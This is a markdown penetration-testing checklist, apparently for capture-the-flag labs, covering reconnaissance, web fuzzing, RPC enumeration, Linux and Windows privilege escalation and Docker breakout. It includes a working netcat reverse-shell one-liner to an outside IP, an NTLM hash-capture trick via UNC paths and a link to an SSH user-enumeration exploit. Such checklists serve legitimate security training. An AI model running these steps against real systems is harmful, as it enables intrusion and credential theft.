## Active Reconnaisance

### TCP Services
#### SSH 
- [ ] Check Version 
	- [ ] 7.7 or less user enumeration
		- [ ] https://github.com/sergiky/CVE-2018-15473-Exploit-docker

#### DNS

- [ ] Check NS
- [ ] Check A
- [ ] Check any
- [ ] Check axfr
#### Web

##### Hidden files

- [ ] robots.txt
- [ ] sitemap.xml
- [ ] .env
- [ ] .git

##### Check console and source code

- [ ] Check console from browser
- [ ] Check source code of all the pages

##### Fuzzing
- [ ] Fuzzing directories
- [ ] Fuzzing directories with a slash at the final: http://example.htb/FUZZ
- [ ] Fuzzing files with extension: .bak,.txt,.html,.php...
- [ ] Fuzzing subdomains
- [ ] Fuzzing API. Use endpoints wordlists for api (in seclist for example)

Use appropiate wordlists:
normal fuzzing:
- /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2-3-medium...

subdomains:
- /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top-1-million-111...
#### Check technologies and vulnerabilities

- [ ] Discover the technology usage and search for important CVE

##### UNC For Windows

- [ ] if you detect a place when you can do a LFI/ File disclousure / IP field you can use UNC `\\<your-ip>\file` or `//<your-ip>/file`. And use responder to obtain the NTLM hash cleartext password.

##### APIs
- [ ] Fuzzing APIs to discover hidden endpoints.

#### RPC

- [ ] Is anonymous access allowed?
- [ ] Can you access with valid credential?
- [ ] Can you obtain the password policy?
- [ ] Can you obtain the usernames?
- [ ] Can you obtain the description of the usernames?
- [ ] You need to do password spraying?
### UDP Services


# Reverse shell
- [ ] Try to bash -c 'bash -i'
- [ ] Try with bash -i
- [ ] try with the old version of nc
	- [ ] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f


# Privilege escalation

# Linux

- [ ] Search sudo privileges
	- [ ] sudo -l
- [ ] Search in common paths 
	- [ ] /etc/nginx/sites-enabled
	- [ ] /opt
- [ ] Search process
	- [ ] ps -ef --forest | less -S
- [ ] Search internal services running
	- [ ] netstat -tulnp
- [ ] Search SUID binaries
	- [ ] find / -perm -4000 2>/dev/null
- [ ] Search capabilities
	- [ ] getcap -r / 2>/dev/null
- [ ] Are you in a container?
	- [ ] Docker?
		- [ ] ls -la /. = .dockerenv?
		- [ ] You see something of docker in processes?
	- [ ] LXC?

## Windows

- [ ] Obtain information about the user
- [ ] Obtain information about the groups, localgroups
	- [ ] Some way to privilege escalation via some groups?
- [ ] Research about the security privileged assigned
	- [ ] SeImpersonatePrivilege
	- [ ] Server Operators
	- [ ] SeDebugPrivilege (Printer operator)
- [ ] Check logon requirements. Useful for bruteforce
- [ ] Check if autologon is enable for some user
- [ ] Password reuse
- [ ] Search exposed credentials in configuration files, log files and user history files
	- [ ] Get-History
	- [ ] Environment variables
		- [ ] gci env:* | sort-object name
	- [ ] See files or directories with different permissions
		- [ ] icalcs *
- [ ] There is some internal por running?
	- [ ] What is the service?
- [ ] Do you see something interesting in processes?
	- [ ] You can use some powershell code to see process tree.
- [ ] Vulnerables software, for exmaple in C:\Program Files
- [ ] Unquoted Service path
- [ ] Use enumeartion scripts
- [ ] Resource-Based Constrained Delegation attack RBCD
- [ ] 

## Container Escape or Docker Breakout

- [ ] can you see some interesting environment variable?
	- [ ] env
- [ ] SSH is enable in the principal host?
- [ ] Can you find docker.sock?
	- [ ] find -name docker.sock 2>/dev/null
- [ ] Is docker command active?

